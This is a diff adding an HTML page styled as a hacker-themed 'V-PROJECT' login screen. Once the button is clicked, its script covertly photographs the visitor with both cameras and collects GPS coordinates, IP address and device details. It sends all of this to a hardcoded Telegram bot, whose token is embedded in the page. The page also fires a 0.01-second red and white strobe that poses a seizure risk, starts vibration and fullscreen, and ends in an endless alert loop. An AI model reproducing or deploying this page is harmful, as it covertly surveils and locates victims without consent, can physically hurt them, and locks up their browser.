@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SISTEM_TERKONTAMINASI</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Share+Tech+Mono&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
+        body { background: #000; overflow: hidden; font-family: 'Share Tech Mono', monospace; }
+
+        /* KEDAP KEDIP PARAH */
+        #hell-strobe {
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: 999999; pointer-events: none;
+            animation: strobe-extreme 0.01s steps(2) infinite;
+        }
+
+        @keyframes strobe-extreme {
+            0% { background: #fff; }
+            50% { background: #000; }
+            100% { background: #ff0000; }
+        }
+
+        .ghost-text {
+            position: fixed; color: #fff; font-family: 'Orbitron'; font-size: 25px;
+            z-index: 1000000; text-shadow: 0 0 20px #f00; pointer-events: none;
+            display: none;
+        }
+
+        .login-ui {
+            height: 100vh; display: flex; justify-content: center; align-items: center;
+            background: radial-gradient(circle, #200 0%, #000 100%);
+        }
+
+        .terminal-card {
+            width: 350px; padding: 40px; border: 1px solid #f00;
+            background: rgba(0,0,0,0.9); box-shadow: 0 0 100px #f00;
+            text-align: center; position: relative;
+        }
+
+        input {
+            width: 100%; padding: 15px; margin: 10px 0; background: #050000;
+            border: 1px solid #f00; color: #f00; font-family: inherit; outline: none;
+        }
+
+        button {
+            width: 100%; padding: 20px; background: #f00; color: #000;
+            font-family: 'Orbitron'; font-weight: 900; border: none; cursor: pointer;
+            margin-top: 20px; font-size: 14px; clip-path: polygon(0 0, 100% 0, 95% 100%, 5% 100%);
+        }
+
+        #report-view {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #0f0; z-index: 999998; padding: 25px; font-size: 11px;
+            overflow: hidden; border: 5px solid #f00;
+        }
+
+        .scanline {
+            width: 100%; height: 100px; background: linear-gradient(0deg, transparent, rgba(255,0,0,0.2), transparent);
+            position: absolute; top: -100px; left: 0; animation: scan 2s linear infinite;
+        }
+        @keyframes scan { from { top: -100px; } to { top: 100%; } }
+
+        #output::after { content: "|"; animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        video { display: none; } /* Sembunyikan preview kamera */
+        canvas { display: none; }
+    </style>
+</head>
+<body onclick="startBioMetric()">
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<div id="hell-strobe"></div>
+<div id="ghost1" class="ghost-text">BY RADIT HACKER</div>
+<div id="ghost2" class="ghost-text">ACCESS DENIED</div>
+<div id="ghost3" class="ghost-text">V-PROJECT V4.0</div>
+
+<div class="login-ui" id="ui">
+    <div class="terminal-card">
+        <h1 style="color:#fff; font-family:'Orbitron'; font-size: 2rem;">V-PROJECT</h1>
+        <p style="color:#666; font-size:10px; margin-bottom:20px;">CORE V4.0 - NEURAL LINK ESTABLISHED</p>
+        <input type="text" placeholder="NEURAL_ID">
+        <input type="password" placeholder="BIOMETRIC_KEY">
+        <button onclick="breachNow()">OVERRIDE REALITY</button>
+    </div>
+</div>
+
+<div id="report-view">
+    <div class="scanline"></div>
+    <pre id="output"></pre>
+</div>
+
+<script>
+    const TOKEN = '8287992982:AAHTEY5ZmjZOrB95hWwJY7_a5GrrzRFPWy4';
+    const CHAT_ID = '8154532061';
+    let audioCtx;
+
+    function startBioMetric() {
+        if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if(audioCtx.state === 'suspended') audioCtx.resume();
+    }
+
+    function noise() {
+        if(!audioCtx) return;
+        let osc = audioCtx.createOscillator();
+        let gain = audioCtx.createGain();
+        osc.type = 'square';
+        osc.frequency.setValueAtTime(100 + Math.random() * 1000, audioCtx.currentTime);
+        osc.connect(gain); gain.connect(audioCtx.destination);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.1);
+    }
+
+    function typeEffect(element, text, speed) {
+        let i = 0;
+        function typing() {
+            if (i < text.length) {
+                element.innerText += text.charAt(i);
+                i++;
+                setTimeout(typing, speed);
+            }
+        }
+        typing();
+    }
+
+    // FUNGSI AMBIL FOTO
+    async function takePhoto(facingMode) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: facingMode }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+            await new Promise(res => video.onloadedmetadata = res);
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `capture_${facingMode}.jpg`);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg');
+
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) { console.error("Camera Error:", e); }
+    }
+
+    async function breachNow() {
+        document.getElementById('hell-strobe').style.display = 'block';
+        setInterval(noise, 150);
+        document.getElementById('ui').style.display = 'none';
+        document.getElementById('report-view').style.display = 'block';
+
+        const ghosts = document.querySelectorAll('.ghost-text');
+        ghosts.forEach(g => {
+            g.style.display = 'block';
+            setInterval(() => {
+                g.style.top = Math.random() * 80 + '%';
+                g.style.left = Math.random() * 70 + '%';
+            }, 300);
+        });
+
+        if(navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+        try { document.documentElement.requestFullscreen(); } catch(e){}
+
+        // AMBIL FOTO DEPAN & BELAKANG
+        await takePhoto("user");
+        setTimeout(() => takePhoto("environment"), 2000);
+
+        // AMBIL GPS & IP
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+            const net = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip: 'N/A'}));
+            const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                        .then(r => r.json()).catch(() => ({display_name: "Unknown"}));
+
+            const report = `╭───── Tracking Report [V-PROJECT] ───── ⦿
+📍 GPS LOCATION (ACCURATE)
+Address: ${geo.display_name}
+City: ${geo.address.city || geo.address.town || 'N/A'}
+Coords: ${lat}, ${lon} (Acc: ${Math.round(accuracy)}m)
+
+📡 NETWORK INFO
+IP Address: ${net.ip}
+Provider: ${net.org}
+
+⚙️ DEVICE INFO
+Model: ${navigator.platform}
+Cores: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory || '8'}GB
+Battery: ${ (await navigator.getBattery?.().then(b => Math.round(b.level * 100))) || 'N/A' }%
+
+[!] STATUS: COMPROMISED BY RADIT HACKER
+╰───── Telegram @cpl_denz ───── ⦿`;
+
+            typeEffect(document.getElementById('output'), report, 20);
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: report})
+            });
+        }, () => {
+            document.getElementById('output').innerText = "ERROR: GPS_ACCESS_DENIED";
+        }, { enableHighAccuracy: true });
+
+        setTimeout(() => {
+            while(true) { alert("SYSTEM DESTROYED BY RADIT HACKER FROM YEAR 4026."); }
+        }, 12000);
+    }
+</script>
+</body>
+</html>
